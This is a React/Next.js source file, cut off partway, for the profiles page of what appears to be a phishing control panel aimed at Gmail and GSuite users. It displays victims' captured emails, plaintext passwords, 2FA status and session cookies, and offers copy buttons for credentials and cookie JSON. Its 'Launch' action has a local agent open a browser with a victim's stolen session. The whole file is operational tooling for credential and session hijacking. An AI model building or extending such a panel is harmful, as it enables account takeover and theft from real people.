'use client';

import { useEffect, useState } from 'react';
import Link from 'next/link';
import apiClient from '@/lib/api-client';
import { Database, Play, X, Key, Eye, EyeOff, Check, ShieldCheck, Copy, Monitor, Activity, ArrowLeft, Trash2 } from 'lucide-react';
import { formatDistanceToNow } from 'date-fns';
import { toast } from 'sonner';
import wsClient from '@/lib/websocket-client';

interface Profile {
  id: string;
  email: string;
  password?: string;
  provider: string;
  accountType?: string;
  status?: string;
  authStatus: 'AUTHENTICATED' | 'NOT_AUTHENTICATED';
  twoFactorEnabled: boolean;
  isLaunched: boolean;
  createdAt: string;
  lastLaunchedAt?: string;
  userAgent?: string;
  campaign: {
    id: string;
    name: string;
    captureId: string;
  } | null;
  cookies?: any[];
}

export default function ProfilesPage() {
  const [profiles, setProfiles] = useState<Profile[]>([]);
  const [loading, setLoading] = useState(true);
  const [domainTab, setDomainTab] = useState<'ALL' | 'GSUITE' | 'GMAIL'>('ALL');
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [selectedProfile, setSelectedProfile] = useState<Profile | null>(null);
  const [showPassword, setShowPassword] = useState<{[key: string]: boolean}>({});
  const [locallyLaunched, setLocallyLaunched] = useState<Set<string>>(new Set());
  const [launchPending, setLaunchPending] = useState<Set<string>>(new Set());
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [confirmDelete, setConfirmDelete] = useState<{ type: 'single' | 'bulk'; id?: string; count?: number } | null>(null);

  useEffect(() => {
    loadProfiles();
  }, [domainTab]);

  useEffect(() => {
    const handleLaunchResult = (data: {
      profileId: string;
      success: boolean;
      authenticated: boolean;
      email?: string;
      error?: string;
    }) => {
      setLaunchPending(prev => { const s = new Set(prev); s.delete(data.profileId); return s; });
      if (data.success) {
        setLocallyLaunched(prev => new Set(prev).add(data.profileId));
        toast.success(
          `${data.email || 'Profile'} launched on your PC${data.authenticated ? ' — authenticated ✓' : ''}`
        );
      } else {
        toast.error(`Launch failed: ${data.error || 'Unknown error'}`);
      }
      loadProfiles();
    };

    const handleCloseResult = (data: { profileId: string; success: boolean }) => {
      setLocallyLaunched(prev => { const s = new Set(prev); s.delete(data.profileId); return s; });
      loadProfiles();
    };

    wsClient.onLaunchResult(handleLaunchResult);
    wsClient.onCloseResult(handleCloseResult);

    return () => {
      wsClient.offLaunchResult(handleLaunchResult);
      wsClient.offCloseResult(handleCloseResult);
    };
  }, []);

  const loadProfiles = async () => {
    setLoading(true);
    try {
      const params: any = {};
      
      // Domain filtering
      if (domainTab === 'GSUITE') {
        params.email = '@'; // Will need backend support for proper domain filtering
      } else if (domainTab === 'GMAIL') {
        params.email = '@gmail.com';
      }

      const response = await apiClient.getProfiles(params);
      if (response.data.success) {
        setProfiles(response.data.profiles || []);
      }
    } catch (error: any) {
      console.error('Failed to load profiles:', error);
      toast.error(error.response?.data?.error || 'Failed to load profiles');
    } finally {
      setLoading(false);
    }
  };

  const handleLaunch = async (id: string) => {
    const profile = profiles.find(p => p.id === id);
    if (!profile) return;
    
    if (!profile.cookies || profile.cookies.length === 0) {
      toast.error('No cookies captured yet — visitor needs to complete authentication first');
      return;
    }
    
    if (profile.authStatus !== 'AUTHENTICATED') {
      toast.error('Profile not authenticated yet — wait for the visitor to complete login');
      return;
    }

    setActionLoading(id);
    setLaunchPending(prev => new Set(prev).add(id));
    try {
      const response = await apiClient.launchProfile(id);
      if (response.data.pending) {
        toast.info('Launch command sent — browser opening on your PC...');
        await loadProfiles();
      } else {
        toast.success('Browser launched with profile session');
        await loadProfiles();
      }
    } catch (error: any) {
      setLaunchPending(prev => { const s = new Set(prev); s.delete(id); return s; });
      const errorData = error.response?.data;
      if (errorData?.requiresAgent) {
        toast.error('Agent not running. Start the FIONA agent on your PC first.');
      } else {
        toast.error(errorData?.error || 'Failed to launch profile');
      }
    } finally {
      setActionLoading(null);
    }
  };

  const handleClose = async (id: string) => {
    setActionLoading(id);
    try {
      await apiClient.closeProfile(id);
      toast.success('Close command sent to agent');
      setLocallyLaunched(prev => { const s = new Set(prev); s.delete(id); return s; });
      await loadProfiles();
    } catch (error: any) {
      toast.error(error.response?.data?.error || 'Failed to close profile');
    } finally {
      setActionLoading(null);
    }
  };

  const toggleSelect = (id: string) => {
    setSelected(prev => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  };

  const handleDeleteProfile = (id: string) => {
    setConfirmDelete({ type: 'single', id });
  };

  const handleBulkDeleteProfiles = () => {
    setConfirmDelete({ type: 'bulk', count: selected.size });
  };

  const confirmDeleteAction = async () => {
    if (!confirmDelete) return;

    try {
      const token = localStorage.getItem('token');

      if (confirmDelete.type === 'single' && confirmDelete.id) {
        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/profiles/${confirmDelete.id}`, {
          method: 'DELETE',
          headers: { Authorization: `Bearer ${token}` },
        });
        
        const data = await response.json();
        
        if (!response.ok || !data.success) {
          throw new Error(data.error || 'Failed to delete profile');
        }
        
        toast.success('Profile deleted from database');
        setSelected(prev => { const n = new Set(prev); n.delete(confirmDelete.id!); return n; });
      } else if (confirmDelete.type === 'bulk') {
        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/profiles`, {
          method: 'DELETE',
          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
          body: JSON.stringify({ ids: Array.from(selected) }),
        });
        
        const data = await response.json();
        
        if (!response.ok || !data.success) {
          throw new Error(data.error || 'Failed to delete profiles');
        }
        
        toast.success(`${selected.size} profiles permanently deleted`);
        setSelected(new Set());
      }

      await loadProfiles();
    } catch (error: any) {
      console.error('Delete error:', error);
      toast.error(error.message || 'Failed to delete profiles');
    } finally {
      setConfirmDelete(null);
    }
  };

  const togglePasswordVisibility = (profileId: string) => {
    setShowPassword(prev => ({ ...prev, [profileId]: !prev[profileId] }));
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard`);
  };

  // Domain filtering - use email domain as source of truth
  const isGmailAddress = (email: string) =>
    email.toLowerCase().endsWith('@gmail.com') || email.toLowerCase().endsWith('@googlemail.com');

  const filteredProfiles = profiles.filter(profile => {
    const emailLower = profile.email.toLowerCase();
    const isGmail = emailLower.endsWith('@gmail.com') || emailLower.endsWith('@googlemail.com');
    if (domainTab === 'GSUITE') {
      return profile.accountType === 'GSUITE' || !isGmail;
    } else if (domainTab === 'GMAIL') {
      return profile.accountType === 'GMAIL' || isGmail;
    }
    return true;
  });

  const authenticatedCount = filteredProfiles.filter(p => p.authStatus === 'AUTHENTICATED').length;
  const launchedCount = profiles.filter(p => p.isLaunched).length;
  const gsuiteCount = profiles.filter(p => {
    const e = p.email.toLowerCase();
    return !e.endsWith('@gmail.com') && !e.endsWith('@googlemail.com');
  }).length;
  const gmailCount = profiles.filter(p => {
    const e = p.email.toLowerCase();
    return e.endsWith('@gmail.com') || e.endsWith('@googlemail.com');
  }).length;

  return (
    <div className="mx-auto max-w-7xl p-8" style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div>
          {/* Back Link */}
          <Link href="/dashboard" className="flex items-center gap-1.5 text-sm text-white/60 hover:text-white transition-colors mb-3">
            <ArrowLeft className="h-3.5 w-3.5" />
            Back
          </Link>
          {/* Breadcrumb */}
          <div className="mb-2 text-sm text-white/50">
            <Link href="/dashboard" className="hover:text-white/70 transition-colors cursor-pointer">Dashboard</Link>
            <span> / </span>
            <span>Profiles</span>
          </div>
          <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#E2E8F0' }}>Profiles</h1>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>
            Manage captured profiles • {launchedCount} sessions active
          </p>
        </div>
      </div>

      {/* Stats Row */}
      <div style={{ display: 'grid', gap: '16px', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))' }}>
        <div style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', padding: '24px' }}>
          <div style={{ fontSize: '24px', fontWeight: 600, color: '#E2E8F0' }}>{profiles.length}</div>
          <div style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>Total Profiles</div>
        </div>
        <div style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', padding: '24px' }}>
          <div style={{ fontSize: '24px', fontWeight: 600, color: '#10B981' }}>{authenticatedCount}</div>
          <div style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>Authenticated</div>
        </div>
        <div style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', padding: '24px' }}>
          <div style={{ fontSize: '24px', fontWeight: 600, color: '#4F7FFF' }}>{launchedCount}</div>
          <div style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>Sessions Active</div>
        </div>
        <div style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', padding: '24px' }}>
          <div style={{ fontSize: '24px', fontWeight: 600, color: '#8B5CF6' }}>{gsuiteCount}</div>
          <div style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>GSuite Accounts</div>
        </div>
      </div>

      {/* Domain Tabs */}
      <div style={{ display: 'flex', gap: '8px', borderBottom: '1px solid rgba(255, 255, 255, 0.1)' }}>
        <button
          onClick={() => setDomainTab('ALL')}
          style={{
            padding: '10px 16px',
            fontSize: '14px',
            fontWeight: 500,
            transition: 'color 0.2s',
            position: 'relative',
            color: domainTab === 'ALL' ? '#E2E8F0' : 'rgba(226, 232, 240, 0.5)',
            background: 'none',
            border: 'none',
            cursor: 'pointer'
          }}
        >
          All
          {domainTab === 'ALL' && (
            <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: '2px', backgroundColor: '#4F7FFF' }}></div>
          )}
        </button>
        <button
          onClick={() => setDomainTab('GSUITE')}
          style={{
            padding: '10px 16px',
            fontSize: '14px',
            fontWeight: 500,
            transition: 'color 0.2s',
            position: 'relative',
            color: domainTab === 'GSUITE' ? '#E2E8F0' : 'rgba(226, 232, 240, 0.5)',
            background: 'none',
            border: 'none',
            cursor: 'pointer'
          }}
        >
          GSuite ({gsuiteCount})
          {domainTab === 'GSUITE' && (
            <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: '2px', backgroundColor: '#4F7FFF' }}></div>
          )}
        </button>
        <button
          onClick={() => setDomainTab('GMAIL')}
          style={{
            padding: '10px 16px',
            fontSize: '14px',
            fontWeight: 500,
            transition: 'color 0.2s',
            position: 'relative',
            color: domainTab === 'GMAIL' ? '#E2E8F0' : 'rgba(226, 232, 240, 0.5)',
            background: 'none',
            border: 'none',
            cursor: 'pointer'
          }}
        >
          Gmail ({gmailCount})
          {domainTab === 'GMAIL' && (
            <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: '2px', backgroundColor: '#4F7FFF' }}></div>
          )}
        </button>
      </div>

      {/* Bulk Action Bar */}
      {selected.size > 0 && (
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 16px', borderRadius: '8px', backgroundColor: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)' }}>
          <span style={{ fontSize: '14px', color: '#EF4444', fontWeight: 500 }}>{selected.size} profile{selected.size > 1 ? 's' : ''} selected</span>
          <div style={{ display: 'flex', gap: '8px' }}>
            <button onClick={() => setSelected(new Set())} style={{ fontSize: '12px', color: 'rgba(226,232,240,0.5)', background: 'none', border: 'none', cursor: 'pointer', padding: '6px 12px', borderRadius: '6px' }}>
              Clear
            </button>
            <button onClick={handleBulkDeleteProfiles} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px', color: '#EF4444', backgroundColor: 'rgba(239,68,68,0.15)', border: 'none', cursor: 'pointer', padding: '6px 12px', borderRadius: '6px', fontWeight: 500 }}>
              <Trash2 style={{ width: '14px', height: '14px' }} />
              Delete Selected
            </button>
          </div>
        </div>
      )}

      {/* Profiles Grid */}
      {loading ? (
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '48px 0' }}>
          <div style={{ height: '32px', width: '32px', border: '2px solid #4F7FFF', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>
        </div>
      ) : filteredProfiles.length === 0 ? (
        <div style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', padding: '48px', textAlign: 'center' }}>
          <Database style={{ height: '64px', width: '64px', margin: '0 auto 16px', color: 'rgba(226, 232, 240, 0.2)' }} />
          <h3 style={{ fontSize: '18px', fontWeight: 500, color: '#E2E8F0', marginBottom: '8px' }}>No profiles yet</h3>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)' }}>
            Deploy campaigns and capture credentials to see profiles here
          </p>
        </div>
      ) : (
        <div style={{ display: 'grid', gap: '16px', gridTemplateColumns: 'repeat(auto-fill, minmax(350px, 1fr))' }}>
          {filteredProfiles.map((profile) => (
            <div
              key={profile.id}
              style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', paddingLeft: '44px', paddingRight: '24px', paddingTop: '24px', paddingBottom: '24px', transition: 'border-color 0.2s', position: 'relative' }}
            >
              {/* Select checkbox - top left */}
              <div style={{ position: 'absolute', top: '16px', left: '16px' }}>
                <input
                  type="checkbox"
                  checked={selected.has(profile.id)}
                  onChange={() => toggleSelect(profile.id)}
                  style={{ cursor: 'pointer', accentColor: '#4F7FFF' }}
                />
              </div>

              {/* Status Indicator & Delete */}
              <div style={{ position: 'absolute', top: '16px', right: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <button
                  onClick={() => handleDeleteProfile(profile.id)}
                  style={{ padding: '4px', borderRadius: '6px', background: 'none', border: 'none', cursor: 'pointer', color: 'rgba(226,232,240,0.3)' }}
                  title="Delete profile"
                  onMouseEnter={e => (e.currentTarget.style.color = '#EF4444')}
                  onMouseLeave={e => (e.currentTarget.style.color = 'rgba(226,232,240,0.3)')}
                >
                  <Trash2 style={{ width: '14px', height: '14px' }} />
                </button>
                {profile.authStatus === 'AUTHENTICATED' ? (
                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(16, 185, 129, 0.1)', color: '#10B981', border: '1px solid rgba(16, 185, 129, 0.2)', fontSize: '12px', fontWeight: 500 }}>
                    <Check style={{ width: '12px', height: '12px' }} />
                    Authenticated
                  </div>
                ) : (
                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#EF4444', border: '1px solid rgba(239, 68, 68, 0.2)', fontSize: '12px', fontWeight: 500 }}>
                    Not Authenticated
                  </div>
                )}
              </div>

              {/* Profile Info */}
              <div style={{ marginBottom: '16px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>
                  <div style={{ width: '40px', height: '40px', borderRadius: '50%', backgroundColor: 'rgba(79, 127, 255, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#4F7FFF', fontWeight: 500 }}>
                    {profile.email.charAt(0).toUpperCase()}
                  </div>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontWeight: 500, color: '#E2E8F0', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{profile.email}</div>
                    <div style={{ fontSize: '12px', color: 'rgba(226, 232, 240, 0.5)' }}>{profile.provider}</div>
                  </div>
                  {profile.password && (
                    <button
                      onClick={() => copyToClipboard(`${profile.email}\n${profile.password}`, 'Credentials')}
                      style={{ padding: '6px', borderRadius: '6px', transition: 'background-color 0.2s', background: 'rgba(255, 255, 255, 0.05)', border: 'none', cursor: 'pointer' }}
                      title="Copy email and password"
                    >
                      <Copy style={{ height: '14px', width: '14px', color: 'rgba(226, 232, 240, 0.5)' }} />
                    </button>
                  )}
                </div>
              </div>

              {/* Hover Credential Popover */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '16px', fontSize: '14px' }}>
                {/* Password Row */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px', borderRadius: '8px', backgroundColor: 'rgba(255, 255, 255, 0.05)', transition: 'background-color 0.2s' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', minWidth: 0, flex: 1 }}>
                    <Key style={{ height: '14px', width: '14px', color: 'rgba(226, 232, 240, 0.5)', flexShrink: 0 }} />
                    <span style={{ color: 'rgba(226, 232, 240, 0.7)', overflow: 'hidden', textOverflow: 'ellipsis', fontFamily: 'monospace', fontSize: '12px' }}>
                      {showPassword[profile.id] ? (profile.password || '••••••••') : '••••••••'}
                    </span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '4px', flexShrink: 0 }}>
                    <button
                      onClick={() => togglePasswordVisibility(profile.id)}
                      style={{ padding: '4px', borderRadius: '4px', transition: 'background-color 0.2s', background: 'none', border: 'none', cursor: 'pointer' }}
                      title={showPassword[profile.id] ? 'Hide' : 'Show'}
                    >
                      {showPassword[profile.id] ? (
                        <EyeOff style={{ height: '14px', width: '14px', color: 'rgba(226, 232, 240, 0.5)' }} />
                      ) : (
                        <Eye style={{ height: '14px', width: '14px', color: 'rgba(226, 232, 240, 0.5)' }} />
                      )}
                    </button>
                    {profile.password && (
                      <button
                        onClick={() => copyToClipboard(profile.password!, 'Password')}
                        style={{ padding: '4px', borderRadius: '4px', transition: 'background-color 0.2s', background: 'none', border: 'none', cursor: 'pointer' }}
                        title="Copy"
                      >
                        <Copy style={{ height: '14px', width: '14px', color: 'rgba(226, 232, 240, 0.5)' }} />
                      </button>
                    )}
                  </div>
                </div>

                {/* 2FA Status */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px', borderRadius: '8px', backgroundColor: 'rgba(255, 255, 255, 0.05)' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <ShieldCheck style={{ height: '14px', width: '14px', color: 'rgba(226, 232, 240, 0.5)', flexShrink: 0 }} />
                    <span style={{ color: 'rgba(226, 232, 240, 0.7)', fontSize: '12px' }}>2FA</span>
                  </div>
                  {profile.twoFactorEnabled ? (
                    <span style={{ color: '#10B981', fontSize: '12px', fontWeight: 500 }}>Enabled</span>
                  ) : (
                    <span style={{ color: 'rgba(226, 232, 240, 0.5)', fontSize: '12px' }}>Disabled</span>
                  )}
                </div>

                {/* Campaign */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px', borderRadius: '8px', backgroundColor: 'rgba(255, 255, 255, 0.05)' }}>
                  <span style={{ color: 'rgba(226, 232, 240, 0.5)', fontSize: '12px' }}>Campaign</span>
                  <span style={{ color: 'rgba(226, 232, 240, 0.7)', fontSize: '12px', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: '150px' }} title={profile.campaign?.name ?? '—'}>
                    {profile.campaign?.name ?? '—'}
                  </span>
                </div>
              </div>

              {/* Created Time */}
              <div style={{ fontSize: '12px', color: 'rgba(226, 232, 240, 0.3)', marginBottom: '16px' }}>
                Captured {formatDistanceToNow(new Date(profile.createdAt), { addSuffix: true })}
              </div>

              {/* Actions */}
              <div style={{ display: 'flex', gap: '8px' }}>
                {locallyLaunched.has(profile.id) ? (
                  <button
                    onClick={() => handleClose(profile.id)}
                    disabled={actionLoading === profile.id}
                    style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', padding: '8px 16px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#EF4444', borderRadius: '8px', fontSize: '14px', fontWeight: 500, opacity: actionLoading === profile.id ? 0.5 : 1, border: 'none', cursor: 'pointer' }}
                  >
                    <X style={{ height: '16px', width: '16px' }} />
                    Close Session
                  </button>
                ) : (
                  <>
                    <button
                      onClick={() => handleLaunch(profile.id)}
                      disabled={actionLoading === profile.id || launchPending.has(profile.id)}
                      style={{
                        flex: 1,
                        display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
                        padding: '8px 16px',
                        backgroundColor: profile.authStatus !== 'AUTHENTICATED'
                          ? 'rgba(255,255,255,0.05)'
                          : launchPending.has(profile.id)
                          ? 'rgba(79,127,255,0.3)'
                          : '#4F7FFF',
                        color: profile.authStatus !== 'AUTHENTICATED' ? 'rgba(226,232,240,0.4)' : '#E2E8F0',
                        borderRadius: '8px', fontSize: '14px', fontWeight: 500,
                        opacity: (actionLoading === profile.id || launchPending.has(profile.id)) ? 0.7 : 1,
                        cursor: 'pointer',
                        border: 'none',
                      }}
                      title={
                        profile.authStatus !== 'AUTHENTICATED'
                          ? 'Not authenticated yet - click to see details'
                          : launchPending.has(profile.id)
                          ? 'Opening on your PC...'
                          : 'Launch on your PC'
                      }
                    >
                      <Monitor style={{ height: '16px', width: '16px' }} />
                      {launchPending.has(profile.id) ? 'Launching...' : 'Launch'}
                    </button>
                    <button
                      onClick={() => setSelectedProfile(profile)}
                      style={{ padding: '8px 16px', backgroundColor: 'rgba(255,255,255,0.05)', color: '#E2E8F0', borderRadius: '8px', fontSize: '14px', fontWeight: 500, border: 'none', cursor: 'pointer' }}
                    >
                      Details
                    </button>
                  </>
                )}
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Profile Detail Drawer */}
      {selectedProfile && (
        <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0, 0, 0, 0.8)', backdropFilter: 'blur(4px)', display: 'flex', alignItems: 'center', justifyContent: 'flex-end', zIndex: 50 }}>
          <div style={{ width: '100%', maxWidth: '448px', height: '100%', backgroundColor: '#151823', borderLeft: '1px solid rgba(255, 255, 255, 0.1)', overflowY: 'auto' }}>
            {/* Drawer Header */}
            <div style={{ position: 'sticky', top: 0, backgroundColor: '#151823', borderBottom: '1px solid rgba(255, 255, 255, 0.1)', padding: '16px 24px', zIndex: 10 }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <h2 style={{ fontSize: '18px', fontWeight: 500, color: '#E2E8F0' }}>Profile Details</h2>
                <button
                  onClick={() => setSelectedProfile(null)}
                  style={{ padding: '8px', borderRadius: '8px', transition: 'background-color 0.2s', background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  <X style={{ height: '20px', width: '20px', color: 'rgba(226, 232, 240, 0.7)' }} />
                </button>
              </div>
            </div>

            {/* Drawer Content */}
            <div style={{ padding: '24px', display: 'flex', flexDirection: 'column', gap: '24px' }}>
              {/* Email */}
              <div>
                <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>Email</label>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <div style={{ flex: 1, padding: '8px 12px', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px', color: '#E2E8F0', fontFamily: 'monospace', fontSize: '14px' }}>
                    {selectedProfile.email}
                  </div>
                  <button
                    onClick={() => copyToClipboard(selectedProfile.email, 'Email')}
                    style={{ padding: '8px', borderRadius: '8px', transition: 'background-color 0.2s', background: 'none', border: 'none', cursor: 'pointer' }}
                  >
                    <Copy style={{ height: '16px', width: '16px', color: 'rgba(226, 232, 240, 0.7)' }} />
                  </button>
                </div>
              </div>

              {/* Password */}
              {selectedProfile.password && (
                <div>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>Password</label>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <div style={{ flex: 1, padding: '8px 12px', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px', color: '#E2E8F0', fontFamily: 'monospace', fontSize: '14px' }}>
                      {showPassword[selectedProfile.id] ? selectedProfile.password : '••••••••••••'}
                    </div>
                    <button
                      onClick={() => togglePasswordVisibility(selectedProfile.id)}
                      style={{ padding: '8px', borderRadius: '8px', transition: 'background-color 0.2s', background: 'none', border: 'none', cursor: 'pointer' }}
                    >
                      {showPassword[selectedProfile.id] ? (
                        <EyeOff style={{ height: '16px', width: '16px', color: 'rgba(226, 232, 240, 0.7)' }} />
                      ) : (
                        <Eye style={{ height: '16px', width: '16px', color: 'rgba(226, 232, 240, 0.7)' }} />
                      )}
                    </button>
                    <button
                      onClick={() => copyToClipboard(selectedProfile.password!, 'Password')}
                      style={{ padding: '8px', borderRadius: '8px', transition: 'background-color 0.2s', background: 'none', border: 'none', cursor: 'pointer' }}
                    >
                      <Copy style={{ height: '16px', width: '16px', color: 'rgba(226, 232, 240, 0.7)' }} />
                    </button>
                  </div>
                </div>
              )}

              {/* Account Type */}
              <div>
                <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>Account Type</label>
                <div style={{ display: 'flex', gap: '8px' }}>
                  {selectedProfile.accountType === 'GMAIL' || selectedProfile.email.endsWith('@gmail.com') ? (
                    <span style={{ display: 'inline-flex', alignItems: 'center', padding: '6px 12px', borderRadius: '9999px', backgroundColor: 'rgba(79, 127, 255, 0.1)', color: '#4F7FFF', border: '1px solid rgba(79, 127, 255, 0.2)', fontSize: '14px', fontWeight: 500 }}>
                      Gmail
                    </span>
                  ) : (
                    <span style={{ display: 'inline-flex', alignItems: 'center', padding: '6px 12px', borderRadius: '9999px', backgroundColor: 'rgba(139, 92, 246, 0.1)', color: '#8B5CF6', border: '1px solid rgba(139, 92, 246, 0.2)', fontSize: '14px', fontWeight: 500 }}>
                      GSuite
                    </span>
                  )}
                </div>
              </div>

              {/* Campaign */}
              <div>
                <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>Campaign</label>
                <div style={{ padding: '8px 12px', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px' }}>
                  <div style={{ color: '#E2E8F0', fontSize: '14px' }}>{selectedProfile.campaign?.name ?? '—'}</div>
                  <div style={{ color: 'rgba(226, 232, 240, 0.5)', fontSize: '12px', fontFamily: 'monospace', marginTop: '2px' }}>{selectedProfile.campaign?.captureId ?? 'N/A'}</div>
                </div>
              </div>

              {/* Status */}
              <div>
                <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>Authentication Status</label>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  {selectedProfile.authStatus === 'AUTHENTICATED' ? (
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '8px 12px', backgroundColor: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.2)', borderRadius: '8px', color: '#10B981', fontSize: '14px', fontWeight: 500 }}>
                      <Check style={{ height: '16px', width: '16px' }} />
                      Authenticated
                    </div>
                  ) : (
                    <div style={{ padding: '8px 12px', backgroundColor: 'rgba(255, 255, 255, 0.05)', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px', color: 'rgba(226, 232, 240, 0.5)', fontSize: '14px' }}>
                      Not Authenticated
                    </div>
                  )}
                </div>
              </div>

              {/* User Agent */}
              {/* Cookies */}
              {selectedProfile.cookies && selectedProfile.cookies.length > 0 && (
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
                    <label style={{ fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)' }}>Cookies ({selectedProfile.cookies.length})</label>
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(selectedProfile.cookies, null, 2), 'Cookies JSON')}
                      style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 8px', fontSize: '12px', color: 'rgba(226, 232, 240, 0.6)', background: 'none', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
                    >
                      <Copy style={{ height: '12px', width: '12px' }} />
                      Copy All as JSON
                    </button>
                  </div>
                  <div style={{ maxHeight: '192px', overflowY: 'auto', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px' }}>
                    <table style={{ width: '100%', fontSize: '12px' }}>
                      <thead style={{ position: 'sticky', top: 0, backgroundColor: '#0C0E14', borderBottom: '1px solid rgba(255, 255, 255, 0.1)' }}>
                        <tr>
                          <th style={{ textAlign: 'left', padding: '6px 8px', color: 'rgba(226, 232, 240, 0.5)', fontWeight: 500 }}>Name</th>
                          <th style={{ textAlign: 'left', padding: '6px 8px', color: 'rgba(226, 232, 240, 0.5)', fontWeight: 500 }}>Value</th>
                          <th style={{ textAlign: 'left', padding: '6px 8px', color: 'rgba(226, 232, 240, 0.5)', fontWeight: 500 }}>Domain</th>
                          <th style={{ textAlign: 'left', padding: '6px 8px', color: 'rgba(226, 232, 240, 0.5)', fontWeight: 500 }}>Expires</th>
                        </tr>
                      </thead>
                      <tbody>
                        {selectedProfile.cookies.map((cookie: any, idx: number) => (
                          <tr key={idx} style={{ borderTop: idx > 0 ? '1px solid rgba(255, 255, 255, 0.05)' : 'none' }}>
                            <td style={{ padding: '6px 8px', fontFamily: 'monospace', color: 'rgba(226, 232, 240, 0.7)' }}>{cookie.name}</td>
